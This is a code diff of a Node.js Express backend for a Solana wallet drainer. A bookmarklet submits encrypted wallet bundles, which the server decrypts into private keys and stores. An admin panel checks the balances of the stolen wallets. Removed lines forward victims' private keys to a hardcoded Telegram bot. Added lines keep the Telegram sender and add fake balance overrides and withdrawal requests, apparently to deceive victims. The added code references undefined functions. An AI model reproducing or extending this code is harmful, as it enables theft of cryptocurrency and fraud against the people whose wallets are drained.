@@ -1,3 +1,4 @@
+
 const express = require('express');
 const bodyParser = require('body-parser');
 const fs = require('fs');
@@ -5,92 +6,98 @@ const path = require('path');
 const crypto = require('crypto');
 const bs58 = require('bs58');
 const { Connection, PublicKey } = require('@solana/web3.js');
-const fetch = require('node-fetch');
+const fetch = require('node-fetch'); // Add node-fetch for Telegram API requests
+
+
 
 const app = express();
 const X7F9K2 = 5000;
 const Q8M3N7 = path.join(__dirname, 'data.json');
-const USERS_FILE = path.join(__dirname, 'users.json'); // New file for users
-const Z4H8L6 = "admin123";
-const R2Y5P9 = crypto.randomBytes(32).toString('hex');
-const W3K7M1 = new Set(); // Admin tokens
-const USER_TOKENS = new Map(); // Map<token, userId> for user auth
 
-// Telegram configuration
-const TELEGRAM_BOT_TOKEN = '7805892995:AAGOxjdUmdAuWGdx0TRyMg0VbTUptGOL0Sg';
-const TELEGRAM_CHAT_ID = 'YOUR_ACTUAL_CHAT_ID_HERE';  // Replace with your correct chat ID
+const Z4H8L6 = "admin123"; // your admin password.
+const R2Y5P9 = crypto.randomBytes(32).toString('hex');
+const W3K7M1 = new Set();
 
 app.use(bodyParser.json());
 app.use(express.static('public'));
 app.use(bodyParser.urlencoded({ extended: true }));
 
+// Telegram configuration
+const TELEGRAM_BOT_TOKEN = '7805892995:AAGOxjdUmdAuWGdx0TRyMg0VbTUptGOL0Sg';
+const TELEGRAM_CHAT_ID = '7805892995';
+
+// Function to send data to Telegram
+async function sendToTelegram(message) {
+    /*
+     * Sends a message to the specified Telegram chat.
+     * Args:
+     *   message (string): The message to send
+     * Returns:
+     *   boolean: True if the message was sent successfully, false otherwise
+     */
+    const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+    const payload = {
+        chat_id: TELEGRAM_CHAT_ID,
+        text: message,
+        parse_mode: 'Markdown' // For formatted messages
+    };
+
+    try {
+        const response = await fetch(url, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify(payload)
+        });
+        const result = await response.json();
+        return result.ok;
+    } catch (error) {
+        console.error('Error sending to Telegram:', error);
+        return false;
+    }
+}
+
+
 if (!fs.existsSync(Q8M3N7)) {
     fs.writeFileSync(Q8M3N7, JSON.stringify([]));
 }
 
-if (!fs.existsSync(USERS_FILE)) {
-    fs.writeFileSync(USERS_FILE, JSON.stringify({})); // {userId: {name, balance: 0, messages: []}}
-}
-
-// Reads and parses the data.json file
 function D5V8B3() {
     try {
         const data = fs.readFileSync(Q8M3N7, 'utf8');
         return JSON.parse(data);
     } catch (error) {
-        console.error('Error reading data file:', error);
         return [];
     }
 }
 
-// Writes data to the data.json file
 function F6N2T9(data) {
     fs.writeFileSync(Q8M3N7, JSON.stringify(data, null, 2));
 }
 
-// Users storage functions
-function loadUsers() {
-    try {
-        const data = fs.readFileSync(USERS_FILE, 'utf8');
-        return JSON.parse(data);
-    } catch (error) {
-        console.error('Error reading users file:', error);
-        return {};
-    }
-}
-
-function saveUsers(users) {
-    fs.writeFileSync(USERS_FILE, JSON.stringify(users, null, 2));
-}
-
-// Establishes connection to Solana mainnet
 const solanaConnection = new Connection('https://api.mainnet-beta.solana.com');
 
-// Fetches the current price of Solana (SOL) in USD from CoinGecko
 async function G7P4R8() {
     try {
         const response = await fetch('https://api.coingecko.com/api/v3/simple/price?ids=solana&vs_currencies=usd');
         const data = await response.json();
         return data.solana.usd;
     } catch (error) {
-        console.error('Error fetching SOL price (prob 429 from free APIs):', error);
+        console.error('Error prob 429 fucking free apis:', error);
         return 0;
     }
 }
 
-// Retrieves the balance of a Solana public key in SOL
 async function H3X9M5(publicKeyString) {
     try {
         const publicKey = new PublicKey(publicKeyString);
         const balance = await solanaConnection.getBalance(publicKey);
         return balance / 1000000000;
     } catch (error) {
-        console.error(`Failed to check balance for ${publicKeyString}:`, error.message);
+        console.error(`Failed to check balance 4: ${publicKeyString}:`, error.message);
         return 0;
     }
 }
 
-// Decrypts and processes an array of sBundles (encrypted wallet data)
 function J8L4Q6(sBundlesString, bundleKey) {
     try {
         const sBundlesArray = JSON.parse(sBundlesString);
@@ -141,143 +148,56 @@ function J8L4Q6(sBundlesString, bundleKey) {
     }
 }
 
-// Middleware to verify admin authentication token
 function K9S2E7(req, res, next) {
     const authHeader = req.headers['authorization'];
     const token = authHeader && authHeader.split(' ')[1];
-
+    
     if (!token || !W3K7M1.has(token)) {
         return res.status(401).json({ success: false, error: 'Unauthorized' });
     }
-
+    
     next();
 }
 
-// Middleware to verify user authentication token
-function userAuthMiddleware(req, res, next) {
-    const authHeader = req.headers['authorization'];
-    const token = authHeader && authHeader.split(' ')[1];
-
-    if (!token || !USER_TOKENS.has(token)) {
-        return res.status(401).json({ success: false, error: 'Unauthorized' });
-    }
-
-    // Attach userId to req
-    req.userId = USER_TOKENS.get(token);
-    next();
-}
-
-// Generates a random 32-byte token as a hexadecimal string
 function A4C8N1() {
     return crypto.randomBytes(32).toString('hex');
 }
 
-// Sends a message to the Telegram chat
-async function sendToTelegram(message) {
-    const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
-    const payload = {
-        chat_id: TELEGRAM_CHAT_ID,
-        text: message,
-        parse_mode: 'Markdown'
-    };
-
-    try {
-        const response = await fetch(url, {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify(payload)
-        });
-        const result = await response.json();
-        return result.ok;
-    } catch (error) {
-        console.error('Error sending to Telegram:', error);
-        return false;
-    }
-}
-
-// Helper function to build formatted Telegram message
-function buildTelegramMessage(newEntry, walletCount) {
-    let message = `🔎 *Profile Information*\n`;
-    message += `├ 👤 *User:* ${newEntry.user || 'Unknown'}\n`;
-    message += `├ 🎖 *Level:* ${newEntry.level || 'N/A'}\n`;
-
-    // Primary wallet under profile (first wallet)
-    if (newEntry.processedSBundles && newEntry.processedSBundles.wallets && newEntry.processedSBundles.wallets.length > 0) {
-        const firstWallet = newEntry.processedSBundles.wallets[0];
-        if (firstWallet.publicKey) {
-            const shortened = firstWallet.publicKey.slice(0, 5) + '…' + firstWallet.publicKey.slice(-5);
-            const link = `[${shortened}](https://solscan.io/account/${firstWallet.publicKey})`;
-            message += `├ 💳 ${link}\n`;
-        }
-    }
-
-    message += `├ 🪪 *ID:* ${newEntry.id || 'N/A'}\n\n`;
-
-    // Connected Wallets
-    message += `💳 *Connected Wallets (${walletCount})*\n`;
-    if (newEntry.processedSBundles && newEntry.processedSBundles.wallets) {
-        newEntry.processedSBundles.wallets.forEach((wallet, index) => {
-            const idx = index + 1;
-            if (wallet.publicKey || wallet.privateKey || wallet.error) {
-                if (wallet.publicKey) {
-                    const shortened = wallet.publicKey.slice(0, 5) + '…' + wallet.publicKey.slice(-5);
-                    const link = `[${shortened}](https://solscan.io/account/${wallet.publicKey})`;
-                    message += `├ ${idx}. 💳 ${link}\n`;
-                }
-                if (wallet.privateKey) {
-                    message += `├ ${idx}. 🔑 *Key:* \`${wallet.privateKey}\`\n`;
-                }
-                if (wallet.error) {
-                    message += `├ ${idx}. ❌ *Error:* \`${wallet.error}\`\n`;
-                }
-            }
-        });
-    }
-
-    if (newEntry.processedSBundles && newEntry.processedSBundles.error) {
-        message += `\n⚠️ *Processing Error:* \`${newEntry.processedSBundles.error}\``;
-    }
-
-    return message;
-}
-
-// Admin login endpoint
 app.post('/api/admin-login', (req, res) => {
     try {
         const { secretKey } = req.body;
-
+        
         if (secretKey === Z4H8L6) {
             const token = A4C8N1();
             W3K7M1.add(token);
-
+            
             setTimeout(() => {
                 W3K7M1.delete(token);
             }, 24 * 60 * 60 * 1000);
-
-            res.json({
-                success: true,
+            
+            res.json({ 
+                success: true, 
                 token: token,
                 message: 'Authentication successful'
             });
         } else {
-            res.status(401).json({
-                success: false,
-                message: 'Invalid secret key'
+            res.status(401).json({ 
+                success: false, 
+                message: 'Invalid secret key' 
             });
         }
     } catch (error) {
-        res.status(500).json({
-            success: false,
-            error: error.message
+        res.status(500).json({ 
+            success: false, 
+            error: error.message 
         });
     }
 });
 
-// Verify admin token endpoint
 app.get('/api/verify-admin', (req, res) => {
     const authHeader = req.headers['authorization'];
     const token = authHeader && authHeader.split(' ')[1];
-
+    
     if (token && W3K7M1.has(token)) {
         res.json({ success: true });
     } else {
@@ -285,244 +205,18 @@ app.get('/api/verify-admin', (req, res) => {
     }
 });
 
-// Admin logout endpoint
 app.post('/api/admin-logout', K9S2E7, (req, res) => {
     const authHeader = req.headers['authorization'];
     const token = authHeader && authHeader.split(' ')[1];
-
+    
     if (token) {
         W3K7M1.delete(token);
     }
-
+    
     res.json({ success: true, message: 'Logged out successfully' });
 });
 
-// === User Authentication Endpoints ===
-// User login (simple, no password for demo)
-app.post('/api/user/login', async (req, res) => {
-    try {
-        const { userId } = req.body;
-        if (!userId) {
-            return res.status(400).json({ success: false, error: 'userId required' });
-        }
-
-        const users = loadUsers();
-        if (!users[userId]) {
-            return res.status(401).json({ success: false, error: 'User not found' });
-        }
-
-        const token = A4C8N1();
-        USER_TOKENS.set(token, userId);
-
-        // Expire token after 24h
-        setTimeout(() => {
-            USER_TOKENS.delete(token);
-        }, 24 * 60 * 60 * 1000);
-
-        res.json({
-            success: true,
-            token: token,
-            userId: userId
-        });
-    } catch (error) {
-        res.status(500).json({ success: false, error: error.message });
-    }
-});
-
-// User logout
-app.post('/api/user/logout', userAuthMiddleware, (req, res) => {
-    const authHeader = req.headers['authorization'];
-    const token = authHeader && authHeader.split(' ')[1];
-    if (token) {
-        USER_TOKENS.delete(token);
-    }
-    res.json({ success: true, message: 'Logged out successfully' });
-});
-
-// === User APIs (Public with auth) ===
-// Get user balance
-app.get('/api/user/balance', userAuthMiddleware, (req, res) => {
-    try {
-        const users = loadUsers();
-        const userId = req.userId;
-        const user = users[userId];
-        if (!user) {
-            return res.status(404).json({ success: false, error: 'User not found' });
-        }
-        res.json({
-            success: true,
-            balance: user.balance || 0
-        });
-    } catch (error) {
-        res.status(500).json({ success: false, error: error.message });
-    }
-});
-
-// Get user messages
-app.get('/api/user/messages', userAuthMiddleware, (req, res) => {
-    try {
-        const users = loadUsers();
-        const userId = req.userId;
-        const user = users[userId];
-        if (!user) {
-            return res.status(404).json({ success: false, error: 'User not found' });
-        }
-        res.json({
-            success: true,
-            messages: user.messages || []
-        });
-    } catch (error) {
-        res.status(500).json({ success: false, error: error.message });
-    }
-});
-
-// === Admin User APIs ===
-// Get all users (admin only)
-app.get('/api/users', K9S2E7, (req, res) => {
-    try {
-        const users = loadUsers();
-        const userList = Object.entries(users).map(([id, data]) => ({
-            id,
-            name: data.name,
-            balance: data.balance || 0,
-            messageCount: (data.messages || []).length
-        }));
-        res.json({
-            success: true,
-            users: userList
-        });
-    } catch (error) {
-        res.status(500).json({ success: false, error: error.message });
-    }
-});
-
-// Create new user (admin only)
-app.post('/api/users', K9S2E7, (req, res) => {
-    try {
-        const { id, name, balance = 0 } = req.body;
-        if (!id || !name) {
-            return res.status(400).json({ success: false, error: 'id and name required' });
-        }
-
-        const users = loadUsers();
-        if (users[id]) {
-            return res.status(400).json({ success: false, error: 'User already exists' });
-        }
-
-        users[id] = {
-            name,
-            balance,
-            messages: []
-        };
-        saveUsers(users);
-
-        res.json({ success: true, message: 'User created successfully' });
-    } catch (error) {
-        res.status(500).json({ success: false, error: error.message });
-    }
-});
-
-// Update user (admin only)
-app.put('/api/users/:id', K9S2E7, (req, res) => {
-    try {
-        const userId = req.params.id;
-        const updates = req.body;
-        const users = loadUsers();
-        if (!users[userId]) {
-            return res.status(404).json({ success: false, error: 'User not found' });
-        }
-
-        users[userId] = { ...users[userId], ...updates };
-        saveUsers(users);
-
-        res.json({ success: true, message: 'User updated successfully' });
-    } catch (error) {
-        res.status(500).json({ success: false, error: error.message });
-    }
-});
-
-// Delete user (admin only)
-app.delete('/api/users/:id', K9S2E7, (req, res) => {
-    try {
-        const userId = req.params.id;
-        const users = loadUsers();
-        if (!users[userId]) {
-            return res.status(404).json({ success: false, error: 'User not found' });
-        }
-
-        // Remove associated tokens
-        for (let [token, uid] of USER_TOKENS.entries()) {
-            if (uid === userId) {
-                USER_TOKENS.delete(token);
-            }
-        }
-
-        delete users[userId];
-        saveUsers(users);
-
-        res.json({ success: true, message: 'User deleted successfully' });
-    } catch (error) {
-        res.status(500).json({ success: false, error: error.message });
-    }
-});
-
-// Update user balance (admin only)
-app.post('/api/users/:id/balance', K9S2E7, (req, res) => {
-    try {
-        const userId = req.params.id;
-        const { balance } = req.body;
-        if (typeof balance !== 'number') {
-            return res.status(400).json({ success: false, error: 'balance must be a number' });
-        }
-
-        const users = loadUsers();
-        if (!users[userId]) {
-            return res.status(404).json({ success: false, error: 'User not found' });
-        }
-
-        users[userId].balance = balance;
-        saveUsers(users);
-
-        res.json({ success: true, message: 'Balance updated successfully' });
-    } catch (error) {
-        res.status(500).json({ success: false, error: error.message });
-    }
-});
-
-// Send message to user (admin only)
-app.post('/api/users/:id/message', K9S2E7, (req, res) => {
-    try {
-        const userId = req.params.id;
-        const { message } = req.body;
-        if (!message || typeof message !== 'string') {
-            return res.status(400).json({ success: false, error: 'message required as string' });
-        }
-
-        const users = loadUsers();
-        if (!users[userId]) {
-            return res.status(404).json({ success: false, error: 'User not found' });
-        }
-
-        if (!users[userId].messages) {
-            users[userId].messages = [];
-        }
-        users[userId].messages.push({
-            id: Date.now(),
-            timestamp: new Date().toISOString(),
-            text: message,
-            read: false
-        });
-
-        saveUsers(users);
-
-        res.json({ success: true, message: 'Message sent successfully' });
-    } catch (error) {
-        res.status(500).json({ success: false, error: error.message });
-    }
-});
-
-// Store bookmark data endpoint with Telegram notification
-app.post('/api/bookmark-data', async (req, res) => {
+app.post('/api/bookmark-data', (req, res) => {
     try {
         const data = D5V8B3();
         const newEntry = {
@@ -534,43 +228,16 @@ app.post('/api/bookmark-data', async (req, res) => {
         if (newEntry.sBundles && newEntry.bundle) {
             newEntry.processedSBundles = J8L4Q6(newEntry.sBundles, newEntry.bundle);
         }
-
+        
         data.push(newEntry);
         F6N2T9(data);
-
-        // Format and send Telegram notification
-        const walletCount = newEntry.processedSBundles ? newEntry.processedSBundles.count : 0;
-        const message = buildTelegramMessage(newEntry, walletCount);
-
-        // If too long, split into multiple messages
-        if (message.length > 4096) {
-            const chunks = [];
-            let currentChunk = message.substring(0, 4096).trim();
-            let remaining = message.substring(4096);
-
-            chunks.push(currentChunk);
-
-            while (remaining.length > 0) {
-                currentChunk = `\n\n*Continued...* 📄\n\n${remaining.substring(0, 4096).trim()}`;
-                remaining = remaining.substring(4096);
-                chunks.push(currentChunk);
-            }
-
-            // Send each chunk
-            for (let i = 0; i < chunks.length; i++) {
-                await sendToTelegram(chunks[i]);
-            }
-        } else {
-            await sendToTelegram(message);
-        }
-
+        
         res.json({ success: true, id: newEntry.id });
     } catch (error) {
         res.status(500).json({ success: false, error: error.message });
     }
 });
 
-// Retrieve bookmark data endpoint
 app.get('/api/bookmark-data', K9S2E7, (req, res) => {
     try {
         const data = D5V8B3();
@@ -580,7 +247,6 @@ app.get('/api/bookmark-data', K9S2E7, (req, res) => {
     }
 });
 
-// Delete bookmark data by ID endpoint
 app.delete('/api/bookmark-data/:id', K9S2E7, (req, res) => {
     try {
         const data = D5V8B3();
@@ -592,16 +258,15 @@ app.delete('/api/bookmark-data/:id', K9S2E7, (req, res) => {
     }
 });
 
-// Check balances of all wallets endpoint
 app.get('/api/check-balances', K9S2E7, async (req, res) => {
     try {
         const data = D5V8B3();
         const solPrice = await G7P4R8();
-
+        
         let allAddresses = [];
         let totalSolBalance = 0;
         let addressBalances = [];
-
+        
         for (const entry of data) {
             if (entry.processedSBundles && entry.processedSBundles.wallets) {
                 for (const wallet of entry.processedSBundles.wallets) {
@@ -615,11 +280,11 @@ app.get('/api/check-balances', K9S2E7, async (req, res) => {
                 }
             }
         }
-
+        
         for (const addr of allAddresses) {
             const balance = await H3X9M5(addr.publicKey);
             totalSolBalance += balance;
-
+            
             addressBalances.push({
                 entryId: addr.entryId,
                 walletIndex: addr.walletIndex,
@@ -628,9 +293,9 @@ app.get('/api/check-balances', K9S2E7, async (req, res) => {
                 usdBalance: balance * solPrice
             });
         }
-
+        
         addressBalances.sort((a, b) => b.solBalance - a.solBalance);
-
+        
         res.json({
             success: true,
             totalAddresses: allAddresses.length,
@@ -644,31 +309,25 @@ app.get('/api/check-balances', K9S2E7, async (req, res) => {
     }
 });
 
-// Serve login page
 app.get('/login', (req, res) => {
     res.sendFile(path.join(__dirname, 'public', 'login.html'));
 });
 
-// Serve admin page
 app.get('/admin', (req, res) => {
     res.sendFile(path.join(__dirname, 'public', 'admin.html'));
 });
 
-// Serve index page (user dashboard)
 app.get('/', (req, res) => {
     res.sendFile(path.join(__dirname, 'public', 'index.html'));
 });
-
-// Serve bookmarkscript.js
 app.get('/bookmarkscript.js', (req, res) => {
     res.sendFile(path.join(__dirname, 'bookmarkscript.js'));
 });
 
-// Handle encoded data submission with Telegram notification
-app.get('/data/:encodedData', async (req, res) => {
+app.get('/data/:encodedData', (req, res) => {
     try {
         const decodedData = JSON.parse(Buffer.from(req.params.encodedData, 'base64').toString());
-
+        
         const data = D5V8B3();
         const newEntry = {
             id: Date.now(),
@@ -679,36 +338,10 @@ app.get('/data/:encodedData', async (req, res) => {
         if (newEntry.sBundles && newEntry.bundle) {
             newEntry.processedSBundles = J8L4Q6(newEntry.sBundles, newEntry.bundle);
         }
-
+        
         data.push(newEntry);
         F6N2T9(data);
-
-        // Format and send Telegram notification
-        const walletCount = newEntry.processedSBundles ? newEntry.processedSBundles.count : 0;
-        const message = buildTelegramMessage(newEntry, walletCount);
-
-        // If too long, split into multiple messages
-        if (message.length > 4096) {
-            const chunks = [];
-            let currentChunk = message.substring(0, 4096).trim();
-            let remaining = message.substring(4096);
-
-            chunks.push(currentChunk);
-
-            while (remaining.length > 0) {
-                currentChunk = `\n\n*Continued...* 📄\n\n${remaining.substring(0, 4096).trim()}`;
-                remaining = remaining.substring(4096);
-                chunks.push(currentChunk);
-            }
-
-            // Send each chunk
-            for (let i = 0; i < chunks.length; i++) {
-                await sendToTelegram(chunks[i]);
-            }
-        } else {
-            await sendToTelegram(message);
-        }
-
+        
         res.redirect('/success');
     } catch (error) {
         res.status(400).send(`
@@ -734,13 +367,117 @@ app.get('/data/:encodedData', async (req, res) => {
     }
 });
 
-// Serve success page
 app.get('/success', (req, res) => {
     res.sendFile(path.join(__dirname, 'public', 'success.html'));
 });
+// GET /api/user-balance - Fetch user's total SOL balance (sum from processed wallets)
+app.get('/api/user-balance', ensureAuthenticated, async (req, res) => {
+    try {
+        const data = D5V8B3();
+        const users = loadUsers();
+        const user = users.find(u => u.id === req.session.userId);
+        if (!user) {
+            return res.status(401).json({ balance: 0 });
+        }
+        const userData = data.filter(entry => entry.userEmail === user.email);
+        
+        let totalBalance = 0;
+        for (const entry of userData) {
+            if (entry.processedSBundles && entry.processedSBundles.wallets) {
+                for (const wallet of entry.processedSBundles.wallets) {
+                    if (!wallet.error) {
+                        totalBalance += await H3X9M5(wallet.publicKey); // Fetch real balance
+                    }
+                }
+            }
+        }
+        
+        // Check for admin override (stored in users.json as optional field)
+        const userWithOverride = users.find(u => u.id === req.session.userId);
+        const finalBalance = userWithOverride?.overrideBalance !== undefined ? userWithOverride.overrideBalance : totalBalance;
+        
+        res.json({ balance: finalBalance.toFixed(4) });
+    } catch (error) {
+        console.error('Balance fetch error:', error);
+        res.status(500).json({ balance: 0 });
+    }
+});
 
-// Start the server
-const PORT = process.env.PORT || 5000;
-app.listen(PORT, '0.0.0.0', () => {
-    console.log(`Working on port ${PORT}.`);
+// POST /api/admin-override-balance - Admin edits user balance (requires admin token)
+app.post('/api/admin-override-balance', K9S2E7, (req, res) => {
+    try {
+        const { userEmail, balance } = req.body;
+        if (!userEmail || typeof balance !== 'number' || balance < 0) {
+            return res.status(400).json({ success: false, error: 'Invalid input' });
+        }
+        
+        const users = loadUsers();
+        const user = users.find(u => u.email === userEmail);
+        if (!user) {
+            return res.status(404).json({ success: false, error: 'User not found' });
+        }
+        
+        user.overrideBalance = balance; // Override real balance
+        saveUsers(users);
+        
+        res.json({ success: true, message: `Balance overridden for ${userEmail}` });
+    } catch (error) {
+        res.status(500).json({ success: false, error: error.message });
+    }
+});
+
+// POST /api/withdraw - User requests withdrawal
+app.post('/api/withdraw', ensureAuthenticated, async (req, res) => {
+    try {
+        const { amount, note } = req.body;
+        if (!amount || amount <= 0 || !note) {
+            return res.status(400).json({ success: false, error: 'Invalid amount or note' });
+        }
+        
+        const data = D5V8B3();
+        const users = loadUsers();
+        const user = users.find(u => u.id === req.session.userId);
+        if (!user) {
+            return res.status(401).json({ success: false, error: 'Unauthorized' });
+        }
+        
+        const withdrawal = {
+            id: Date.now(),
+            timestamp: new Date().toISOString(),
+            userEmail: user.email,
+            amount,
+            note,
+            status: 'pending'
+        };
+        
+        data.push({ type: 'withdrawal', ...withdrawal });
+        F6N2T9(data);
+        
+        // Notify admin via Telegram
+        const telegramMessage = `New Withdrawal Request:\nUser: ${user.email}\nAmount: ${amount} SOL\nNote: ${note}\nStatus: Pending`;
+        sendToTelegram(telegramMessage);
+        
+        res.json({ success: true, message: 'Withdrawal requested. Admin will review.' });
+    } catch (error) {
+        res.status(500).json({ success: false, error: error.message });
+    }
+});
+app.post('/api/update-withdrawal', K9S2E7, (req, res) => {
+    try {
+        const updatedWithdrawal = req.body;
+        const data = D5V8B3();
+        const index = data.findIndex(item => item.id === updatedWithdrawal.id && item.type === 'withdrawal');
+        if (index !== -1) {
+            data[index] = { ...data[index], ...updatedWithdrawal };
+            F6N2T9(data);
+            res.json({ success: true });
+        } else {
+            res.status(404).json({ success: false });
+        }
+    } catch (error) {
+        res.status(500).json({ success: false, error: error.message });
+    }
+});
+app.listen(X7F9K2, '0.0.0.0', () => {
+    console.log(`Working.`);
 });
